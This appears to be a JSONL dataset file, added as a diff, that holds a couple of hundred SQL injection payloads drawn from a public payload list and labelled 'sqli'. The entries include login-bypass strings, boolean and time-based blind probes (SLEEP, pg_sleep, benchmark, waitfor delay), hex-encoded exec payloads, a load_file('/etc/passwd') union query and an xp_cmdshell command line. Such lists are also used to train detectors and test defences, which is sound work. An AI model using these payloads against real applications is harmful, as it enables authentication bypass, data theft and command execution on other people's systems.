+{"payload": "admin\" #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or \"1\"=\"1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or \"1\"=\"1\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or \"1\"=\"1\"--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or \"1\"=\"1\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\" or 1=1/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or \"1\"=\"1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or \"1\"=\"1\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or \"1\"=\"1\"--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or \"1\"=\"1\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or (\"1\"=\"1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or (\"1\"=\"1\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or (\"1\"=\"1\"--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\") or (\"1\"=\"1\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin\"or 1=1 or \"\"=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' and substring(password/text(),1,1)='7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or '", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or '1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or '1'='1'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or '1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or '1'='1'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin' or 1=1/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or '1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or '1'='1'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or '1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or '1'='1'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or ('1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or ('1'='1'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or ('1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin') or ('1'='1'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "admin'or 1=1 or ''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,1,1))='M'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,1,1))='X'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,2,1))='i'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,2,1))='y'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,3,1))='S'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,3,1))='X'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and (select substring(@@version,3,1))='c'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 1 in (select var from temp)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 1=( if((load_file(char(110,46,101,120,11 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "and 1=1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "anything' OR 'x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "as", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "asc", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "benchmark(50000000,MD5(1))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "benchmark(50000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "benchmark(50000000,MD5(1))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "bfilename", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "char%4039%41%2b%40SELECT", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @q nvarchar (200) 0x730065006c00650063 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @q nvarchar (200) select @q = 0x770061 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @q nvarchar (4000) select @q =", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @s varchar (200) select @s = 0x73656c6 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @s varchar (8000) select @s = 0x73656c ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @s varchar(200) select @s = 0x77616974 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "declare @s varchar(22) select @s =", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "delete", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "desc", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "distinct", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "exec sp", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "exec xp", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "exec(@s)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "fake@ema'or'il.nl'='il.nl", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "group by userid having 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "handler", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "having", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "having 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi or 1=1 --\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi or a=a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi\"\"\"\") or (\"\"\"\"a\"\"\"\"=\"\"\"\"a\"\"\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi' or 'a'='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi' or 'x'='x';", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi' or 1=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "hi') or ('a'='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "insert", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "like", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "like '%'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "limit", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or \"\"a\"\"=\"\"a\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or ''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or '1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or '1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or '7659'='7659", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 'a'='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 'something' = 'some'+'thing'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 'text' = n'text'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 'text' > 't'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 'unusual' = 'unusual'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 'whatever' in ('whatever')", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or (EXISTS)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 0=0 #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 0=0 #\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 0=0 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 0=0 –", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1 --'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1 in (select @@version)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1 /*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1 or \"\"=", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1 or ''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1--\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 1=1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 2 > 1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 2 between 1 and 3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or 3=3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or SLEEP(5)=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or SLEEP(5)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or a = a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or a=a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or a=a--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or benchmark(50000000,MD5(1))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or benchmark(50000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or benchmark(50000000,MD5(1))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or isNULL(1/0) /*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or pg_SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or pg_SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or pg_SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or pg_sleep(__TIME__)--\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or sleep(__TIME__)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or sleep(__TIME__)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or true", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or true--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or username like char(37);", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or%201=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "or%201=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "order by", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "password:*/=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "pg_SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "pg_SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "pg_SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "procedure", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "replace", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "select", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "select * from information_schema.tables--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "select name from syscolumns where id = (sele ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "sleep(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "sqlvuln", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "sqlvuln;", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "t'exec master..xp_cmdshell 'nslookup www.googl ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "t'exec master..xp_cmdshell 'nslookup www.google.com'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "to_timestamp_tz", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "truncate", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "tz_offset", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "uni/**/on sel/**/ect", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "union all select @@version--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "union select", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "union select * from users where login = char ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "union select 1,load_file('/etc/passwd'),1,1,1;", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "update", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "waitfor delay '00:00:05'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "waitfor delay '00:00:05'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "waitfor delay '00:00:05'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "x' AND 1=(SELECT COUNT(*) FROM tabname); --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "x' AND email IS NULL; --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "x' AND members.email IS NULL; --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "x' AND userid IS NULL; --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "x' OR full_name LIKE '%Bob%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "x' or 1=1 or 'x'='y", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "|", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "||'6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "||(elt(-3+5,bin(15),ord(10),hex(char(45))))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "||6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "||UTL_HTTP.REQUEST", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "Ã½ or 1=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "â or 1=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "â or 3=3 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
